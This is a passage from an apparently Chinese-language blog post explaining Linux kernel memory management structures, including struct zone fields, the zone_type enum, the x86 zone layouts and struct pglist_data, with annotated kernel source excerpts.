zone 对应的内存区域中的 pages 总数, <strong>包括空洞</strong></p><h3 id="present-pages：-zone-中存在的物理页框数"><a href="#present-pages：-zone-中存在的物理页框数" class="headerlink" title="present_pages： zone 中存在的物理页框数"></a>present_pages： zone 中存在的物理页框数</h3><p>该字段用以标识  zone 中实际存在的物理页框数</p><h3 id="managed-pages：zone-中-buddy-system-管理的页面数量"><a href="#managed-pages：zone-中-buddy-system-管理的页面数量" class="headerlink" title="managed_pages：zone 中 buddy system 管理的页面数量"></a>managed_pages：zone 中 buddy system 管理的页面数量</h3><p>该字段用以标识 zone 中 buddy system 管理的页面数量</p><h3 id="free-area-：buddy-system-按照-order-管理的页面"><a href="#free-area-：buddy-system-按照-order-管理的页面" class="headerlink" title="**free_area**：buddy system 按照 order 管理的页面"></a>**free_area**：buddy system 按照 order 管理的页面</h3><p>该字段用以存储 buddy system 按照 order 管理的页面，为一个 <code>free_area</code> 结构体数组，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，这里放一张 overview</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>free_area 中并非只有一个双向链表，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="vm-stat：统计数据"><a href="#vm-stat：统计数据" class="headerlink" title="vm_stat：统计数据"></a>vm_stat：统计数据</h3><p>该数组用来进行数据统计，按照枚举类型 <code>zone_stat_item</code> 分为多个数组，以统计不同类型的数据（比如说 <code>NR_FREE_PAGES</code> 表示 zone 中的空闲页面1数量）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_stat_item</span> &#123;</span></span><br><span class="line"><span class="comment">/* First 128 byte cacheline (assuming 64 bit words) */</span></span><br><span class="line">NR_FREE_PAGES,</span><br><span class="line">NR_ZONE_LRU_BASE, <span class="comment">/* Used only for compaction and reclaim retry */</span></span><br><span class="line">NR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,</span><br><span class="line">NR_ZONE_ACTIVE_ANON,</span><br><span class="line">NR_ZONE_INACTIVE_FILE,</span><br><span class="line">NR_ZONE_ACTIVE_FILE,</span><br><span class="line">NR_ZONE_UNEVICTABLE,</span><br><span class="line">NR_ZONE_WRITE_PENDING,<span class="comment">/* Count of dirty, writeback and unstable pages */</span></span><br><span class="line">NR_MLOCK,<span class="comment">/* mlock()ed pages found and moved off LRU */</span></span><br><span class="line"><span class="comment">/* Second 128 byte cacheline */</span></span><br><span class="line">NR_BOUNCE,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> IS_ENABLED(CONFIG_ZSMALLOC)</span></span><br><span class="line">NR_ZSPAGES,<span class="comment">/* allocated in zsmalloc */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">NR_FREE_CMA_PAGES,</span><br><span class="line">NR_VM_ZONE_STAT_ITEMS &#125;;</span><br></pre></td></tr></table></figure><h3 id="flags：标志位-1"><a href="#flags：标志位-1" class="headerlink" title="flags：标志位"></a>flags：标志位</h3><p>该 zone 的标志位，用以标识其所处的状态</p><h2 id="II-zone-的分类"><a href="#II-zone-的分类" class="headerlink" title="II.zone 的分类"></a>II.zone 的分类</h2><p>在 Linux kernel 当中，我们根据内存区段的不同用途，将其划分为不同的 zone，在 <code>/include/linux/mmzone.h</code> 中有着相应的枚举定义，如下：</p><blockquote><p>摆烂了，可能某天想起来会补充翻译</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment">     * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment">     * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment">     * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment">     * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment">     * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment">     * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment">     * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">    ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">    ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment">     * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment">     * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment">     * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment">     * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment">     * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment">     * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment">     * access.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment">     * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment">     * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment">     * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment">     * to increase the number of THP/huge pages. Notable special cases are:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment">     *    essentially turn such pages unmovable. Memory offlining might</span></span><br><span class="line"><span class="comment">     *    retry a long time.</span></span><br><span class="line"><span class="comment">     * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment">     *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment">     *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment">     * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment">     *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment">     *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment">     *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment">     * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment">     *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment">     * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment">     *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment">     *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment">     *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment">     *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment">     *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment">     *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment">     *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment">     *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment">     * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment">     * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment">     * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment">     * there can be false negatives).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">    ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="X86-32"><a href="#X86-32" class="headerlink" title="X86-32"></a>X86-32</h3><p>如下表格所示（懒得找图了）</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">16MB</td><td align="center">896MB</td></tr><tr><td align="center">ZONE_HIGHMEM</td><td align="center">896MB</td><td align="center">…</td></tr></tbody></table><p>通常我们简单地划分为两部分：</p><ul><li><code>线性映射区</code>（前 896MB）：这一块内存直接映射到物理内存地址 0 起始往后的总计 896MB，为<strong>线性映射</strong></li><li><code>高端内存</code>（从 896MB 开始往后）：这一块内存的映射是<strong>不连续的</strong></li></ul><h3 id="X86-64"><a href="#X86-64" class="headerlink" title="X86-64"></a>X86-64</h3><p>如下表格所示（懒得找图了）</p><table><thead><tr><th align="center">Type</th><th align="center">Start address</th><th align="center">End address</th></tr></thead><tbody><tr><td align="center">ZONE_DMA</td><td align="center">0MB</td><td align="center">16MB</td></tr><tr><td align="center">ZONE_DMA32</td><td align="center">16MB</td><td align="center">4GB</td></tr><tr><td align="center">ZONE_NORMAL</td><td align="center">4GB</td><td align="center">…</td></tr></tbody></table><p>在 64 位的 Linux kernel 中没有了“高端内存”这一概念</p><h1 id="0x03-struct-pglist-data：节点"><a href="#0x03-struct-pglist-data：节点" class="headerlink" title="0x03.struct pglist_data：节点"></a>0x03.struct pglist_data：节点</h1><p>zone 再向上一层便是<strong>节点</strong>——Linux 将_内存控制器（memory controller）_作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为_本地内存_，不同处理器之间通过总线进行进一步的连接。如下图所示，一个MC对应一个节点：</p><p><img src="https://i.loli.net/2021/11/27/hAopSNYg23VeWzq.png" alt="image.png"></p><p>一个节点使用 <code>pglist_data</code> 结构进行描述，该结构定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在 NUMA 机器上, 每个 NUMA 节点都有一个 pg_data_t 用以描述其内存布局。</span></span><br><span class="line"><span class="comment"> * 在 UMA 机器上则只有一个单独的 pglist_data 描述整个内存。</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 内存统计数据与页置换数据结构由一个 per-zone basis维持</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * node_zones 字段包含该节点所拥有的 zones。 并非所有的 zone 都已被填充，但这是一个满的列表。</span></span><br><span class="line"><span class="comment">     * 它被该节点的 node_zonelists 以及其他节点的 node_zonelists 所引用.</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * node_zonelists 包含有对所有节点中所有区的引用。</span></span><br><span class="line"><span class="comment">     * 通常第一个区将会作为该节点的 node_zones 的引用.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nr_zones; <span class="comment">/* 该节点中被填充的 zone 的数量 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_FLAT_NODE_MEM_MAP    <span class="comment">/* 即 SPARSEMEM */</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 若你期望 node_start_pfn, node_present_pages, </span></span><br><span class="line"><span class="comment">     * node_spanned_pages 或 nr_zones 保持不变，</span></span><br><span class="line"><span class="comment">     * 必须在任何时刻持有（这个锁）。</span></span><br><span class="line"><span class="comment">     * 同时在 deferred page 初始化期间对 pgdat-&gt;first_deferred_pfn 进行同步。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * （内核）提供了 pgdat_resize_lock() 与 pgdat_resize_unlock() </span></span><br><span class="line"><span class="comment">     * 以在没有对 CONFIG_MEMORY_HOTPLUG 或 CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">     * 进行检查的情况下操纵 node_size_lock </span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 基于 zone-&gt;lock 与 zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_start_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_present_pages; <span class="comment">/* 所有物理页的数量 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> node_spanned_pages; <span class="comment">/* 所有物理页的大小，包括空洞 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> node_id;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span>    <span class="comment">/* 由 mem_hotplug_begin/end() 保护 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kswapd_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> kswapd_failures;        <span class="comment">/* 进行了 &#x27;reclaimed == 0&#x27; 判断的次数 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="type">int</span> kcompactd_max_order;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 这是每个 node 保留的对用户空间分配不可用的页面</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 若存在更多的未映射页面，则节点回收将会变得活跃</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        min_unmapped_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 页回收使用的写敏感字段 */</span></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 若在大机器上的内存初始化被推迟了，那么这是</span></span><br><span class="line"><span class="comment">     * 第一个需要被初始化的 PFN</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 页回收扫描器通常访问的字段 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> 若开启了 MEMCG 则其将不会被使用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 使用 mem_cgroup_lruvec() 以查询 lruvecs.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>        __<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        flags;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Per-node vmstats */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure><h2 id="几个比较重要的字段"><a href="#几个比较重要的字段" class="headerlink" title="几个比较重要的字段"></a>几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="node-zones-：node-的-zone-列表"><a href="#node-zones-：node-的-zone-列表" class="headerlink" title="**node_zones**：node 的 zone 列表"></a>**node_zones**：node 的 zone 列表</h3><p>节点中最重要的字段 <code>node_zones</code> 作为一个 <code>zone 结构体数组</code> 记录了<strong>本节点上所有的 zone</strong>，其中有效的 zone 的个数由节点结构体的 <code>nr_zones</code> 字段指出</p><h3 id="node-zonelists：内存分配时备用-zone-的搜索顺序"><a href="#node-zonelists：内存分配时备用-zone-的搜索顺序" class="headerlink" title="node_zonelists：内存分配时备用 zone 的搜索顺序"></a>node_zonelists：内存分配时备用 zone 的搜索顺序</h3><p>该字段用以确定内存分配时对备用的 zone 的搜索顺序，在本节点常规内存分配失败时会沿着这个数组进行搜索，其中包含的 zone <strong>可以是非本节点的 zone</strong></p><p>这是一个其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span></span><br><span class="line"><span class="comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span></span><br><span class="line"><span class="comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span></span><br><span class="line"><span class="comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span></span><br><span class="line"><span class="comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span></span><br><span class="line"><span class="comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* 指向实际上的 zone 的指针 */</span></span><br><span class="line"><span class="type">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="nr-zones：node-中-zone-的数量"><a href="#nr-zones：node-中-zone-的数量" class="headerlink" title="nr_zones：node 中 zone 的数量"></a>nr_zones：node 中 zone 的数量</h3><p>该字段存储了该节点中所有可用的 zone 的数量</p><h3 id="node-start-pfn：node-的起始页框标号"><a href="#node-start-pfn：node-的起始页框标号" class="headerlink" title="node_start_pfn：node 的起始页框标号"></a>node_start_pfn：node 的起始页框标号</h3><p>该字段记录了该节点上的物理内存起始页框标号</p><h3 id="node-present-pages：node-中物理页的总数量"><a href="#node-present-pages：node-中物理页的总数量" class="headerlink" title="node_present_pages：node 中物理页的总数量"></a>node_present_pages：node 中物理页的总数量</h3><p>该字段记录了节点中可用的物理页的总数量</p><h3 id="unsigned-long-node-spanned-pages：-node-中物理页的总大小"><a href="#unsigned-long-node-spanned-pages：-node-中物理页的总大小" class="headerlink" title="unsigned long node_spanned_pages： node 中物理页的总大小"></a>unsigned long node_spanned_pages： node 